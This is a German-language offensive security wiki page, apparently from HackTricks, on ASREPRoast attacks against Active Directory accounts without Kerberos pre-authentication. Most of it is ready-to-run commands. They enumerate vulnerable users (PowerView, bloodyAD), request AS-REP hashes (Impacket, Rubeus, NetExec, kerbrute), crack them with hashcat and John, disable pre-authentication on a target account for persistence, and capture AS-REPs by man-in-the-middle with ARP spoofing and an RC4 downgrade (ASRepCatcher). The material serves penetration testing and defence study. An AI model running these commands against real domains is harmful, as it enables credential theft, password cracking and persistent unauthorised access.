# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast ist ein Security-Angriff, der Nutzer ausnutzt, denen das **Kerberos pre-authentication required attribute** fehlt. Im Wesentlichen ermöglicht diese Schwachstelle Angreifern, Authentifizierung für einen Benutzer vom Domain Controller (DC) anzufordern, ohne das Passwort des Benutzers zu benötigen. Der DC antwortet dann mit einer Nachricht, die mit dem aus dem Passwort abgeleiteten Schlüssel des Benutzers verschlüsselt ist, und Angreifer können versuchen, diese offline zu cracken, um das Passwort des Benutzers zu entdecken.

Die wichtigsten Anforderungen für diesen Angriff sind:

- **Fehlende Kerberos pre-authentication**: Zielbenutzer dürfen dieses Security-Feature nicht aktiviert haben.
- **Verbindung zum Domain Controller (DC)**: Angreifer benötigen Zugriff auf den DC, um Anfragen zu senden und verschlüsselte Nachrichten zu empfangen.
- **Optional domain account**: Mit einem domain account können Angreifer verwundbare Benutzer effizienter über LDAP-Abfragen identifizieren. Ohne einen solchen account müssen Angreifer Benutzernamen erraten.

#### Aufzählung verwundbarer Benutzer (domain credentials benötigt)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### AS_REP-Nachricht
```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> Rubeus fordert standardmäßig **RC4** an, daher zeigt Event ID **4768** normalerweise **preauth type 0** und **ticket encryption type 0x17**. Wenn du **`/aes`** hinzufügst (oder RC4 für das Ziel deaktiviert ist), erwarte stattdessen **AES etypes**.

#### Quick one-liners (Linux)

- Potenzielle Ziele zuerst enumerieren (z. B. aus geleakten Build-Pfaden) mit Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Eine ganze Username-Liste ohne gültige creds mit NetExec roasten: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`
- Wenn du creds hast, kann NetExec LDAP abfragen und dir jedes roastable account anfordern: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`
- Wenn die Ausgabe mit **`$krb5asrep$23$`** beginnt, cracke sie mit Hashcat **`-m 18200`**. Wenn sie mit **`$krb5asrep$17$`** oder **`$krb5asrep$18$`** beginnt, verwende besser John **`--format=krb5asrep`**.

### Cracking

Gehe nicht davon aus, dass jeder AS-REP roast RC4 ist. Moderne Tooling kann **RC4** (`$krb5asrep$23$`) oder **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`) zurückgeben, abhängig vom angeforderten/ausgehandelten enctype. **`hashcat -m 18200`** ist für **etype 23**, während **John** `krb5asrep` direkt für **17/18/23** behandelt.
```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```
### Persistenz

Erzwinge, dass **preauth** für einen Benutzer nicht erforderlich ist, wenn du **GenericAll**-Berechtigungen hast (oder Berechtigungen zum Schreiben von Eigenschaften):
```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast ohne Anmeldeinformationen

Ein Angreifer kann eine Man-in-the-middle-Position nutzen, um AS-REP-Pakete abzufangen, während sie das Netzwerk durchlaufen, ohne sich darauf zu verlassen, dass Kerberos pre-authentication deaktiviert ist. Daher funktioniert es für alle Benutzer auf dem VLAN.\
Wenn du den verwandten no-credential-Trick möchtest, der ein **service ticket** statt eines **TGT** von einem no-preauth principal zurückgibt, siehe [Kerberoast](kerberoast.md).

[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) ermöglicht uns genau das. Der `relay`-Modus ist offensiv der interessante, weil er **RC4** erzwingen kann, wenn der Client weiterhin **etype 23** ankündigt; `listen` bleibt passiv und fängt einfach das ab, was der Client/DC ausgehandelt hat.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Referenzen

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
